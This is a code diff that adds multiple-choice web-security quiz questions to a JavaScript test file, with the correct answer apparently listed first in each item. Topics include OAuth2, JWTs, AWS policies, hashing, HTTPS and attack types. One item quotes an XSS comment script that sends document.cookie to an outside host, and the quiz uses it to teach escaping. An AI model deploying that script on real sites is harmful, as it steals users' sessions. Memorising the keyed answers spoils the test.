@@ -1240,6 +1240,166 @@ addSingleQuestionToMath(
     ["an SQL", "does"]
   ]
 );
+addSingleQuestionToMath(
+  null,
+  "The key components of security are %s.",
+  [
+    ["authorization, authentication, auditing, and encryption"],
+    ["certification, internal reviews, budgets, and authorization"],
+    ["training, experience, auditing, and assignments"],
+    ["authentication, metrics, processes, and internal reviews"],
+    ["certification, encryption, training, and experience"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "OAuth2 is %s protocol for %s.",
+  [
+    ["an authorization", "granting access to web services and allowing third-party authentication (like logging into Facebook to access TikTok)"],
+    ["an HTTP", "posting user information"],
+    ["a SAML", "single sign-on"],
+    ["a DHCP", "assigning an IP address after login"],
+    ["a TCP", "for auditing"]
+  ]
+);
+addSingleQuestionToMath(
+  createPreamble(
+    null,
+    [
+      "You've logged in to AWS Cognito and received a JWT (JSON Web Token).",
+      "",
+      "You want to extract the OAuth2 access token.",
+    ]),
+  "To get the token, extract the content %s, %s what you've extracted, then get the token from the content (which is probably a JSON object).",
+  [
+    ["between the two periods", "base64-decode"],
+    ["to the left of the first period", "base64-decode"],
+    ["between the two periods", "decrypt"],
+    ["to the left of the first period", "decrypt"],
+    ["to the right of the second period", "decrypt"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "A CAPTCHA attempts to determine whether the user %s.",
+  [
+    ["is a person or a bot"],
+    ["has administrative rights"],
+    ["is logged in"],
+    ["has exceed the usage limit"],
+    ["is from the same country as the web application"]
+  ]
+);
+addSingleQuestionToMath(
+  createPreamble(
+    null,
+    [
+      "An AWS user is assigned a policy with this definition.",
+      "",
+      "{",
+      "    \"Version\": \"2012-10-17\",",
+      "    \"Statement\": [",
+      "        {",
+      "            \"Effect\": \"Allow\",",
+      "            \"Action\": \"s3:*\",",
+      "            \"Resource\": \"*\"",
+      "        }",
+      "    ]",
+      "}",
+    ]),
+  "This user %s be able to do %s to %s S3 resources.",
+  [
+    ["will", "anything", "any"],
+    ["will not", "anything", "any"],
+    ["will", "some things", "any"],
+    ["will", "anything", "some"],
+    ["will", "some things", "some"]
+  ]
+);
+addSingleQuestionToMath(
+  createPreamble(
+    null,
+    [
+      "Public-key encryption relies on the observation that it's much easier to find two large prime numbers (private keys) to multiply together than it is to factorize the product (public key) of the two prime numbers."
+    ]),
+  "The product of the two prime numbers %s. The prime numbers that are factors in the product %s.",
+  [
+    ["can and should be released to the public", "definitely shouldn't be released to the public"],
+    ["can and should be released to the public", "can and should be released to the public"],
+    ["definitely shouldn't be released to the public", "definitely shouldn't be released to the public"],
+    ["definitely shouldn't be released to the public", "can and should be released to the public"],
+    ["can and should be released to the public", "should be immediately deleted"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "When initiating an HTTPS connection, a browser will %s.",
+  [
+    ["accept a certificate signed by a global certificate authority and reject a self-signed certificate"],
+    ["reject both a certificate signed by a global certificate authority and a self-signed certificate"],
+    ["accept both a certificate signed by a global certificate authority and a self-signed certificate"],
+    ["accept a self-signed certificate and reject a certificate signed by a global certificate authority"],
+    ["send a certificate for the server to use if the server doesn't already have one"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "Both hashing and encryption %s, but hashes differ in that they %s.",
+  [
+    ["scramble things up and provide consistent output", "can't be unscrambled and tend to always have the same output size no matter what the input is"],
+    ["require an encryption key and a self-signed certificate", "can be decrypted and always have different output for the same input"],
+    ["scramble things up and provide consistent output whose size varies by the length of the input", "can be decrypted by a self-signed certificate with private key"],
+    ["provide user security", "can be decrypted"],
+    ["produce output that the user can easily interpret", "produce output whose length is proportional to the input"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "Hashing is very good for %s.",
+  [
+    ["determining whether two files are the same without comparing them byte-by-byte"],
+    ["encryption"],
+    ["ensuring that the user has logged out of a system by letting the session cookie expire"],
+    ["providing intuitive content in a user interface"],
+    ["setting HTTP request parameters"]
+  ]
+);
+addSingleQuestionToMath(
+  createPreamble(
+    null,
+    [
+      "A user posts the following comment on a video-game review web site.",
+      "",
+      "        Gimme your session token in 5 seconds.",
+      "        <script>",
+      "          setTimeout(",
+      "            function() {",
+      "              window.location.href = \"https://postman-echo.com/get?userSession=\" + document.cookie;",
+      "            },",
+      "            5000",
+      "          );",
+      "        </script>"
+    ]),
+  "The user is trying to initiate %s attack which can be defended against %s.",
+  [
+    ["an XSS (Cross-Site Scripting)", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
+    ["a CSRF (Cross-Site Request Forgery)", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
+    ["an SQL injection", "if the user's comment is 'HTML escaped' (for instance, convert '<' to '&lt;')"],
+    ["an SQL injection", "if CSRF tokens are used"],
+    ["a CSRF (Cross-Site Request Forgery)", "if CSRF tokens are used"]
+  ]
+);
+addSingleQuestionToMath(
+  null,
+  "A 'brute-force' attack tries to %s. A 'denial-of-service' attack tries to %s.",
+  [
+    ["attempt all combinations of something (like a password)", "overwhelm a web site with bogus web calls"],
+    ["overwhelm a web site with bogus web calls", "attempt all combinations of something (like a password)"],
+    ["physically damage hardware", "change the access permissions of users so that none of them can access the web site"],
+    ["downgrade HTTPS to HTTP", "change the IP address of the caller"],
+    ["resign a server's certificate with a dubious third party", "strips session tokens from the caller"]
+  ]
+);
 //Verbal
 addPartToVerbal(
   createPreamble(
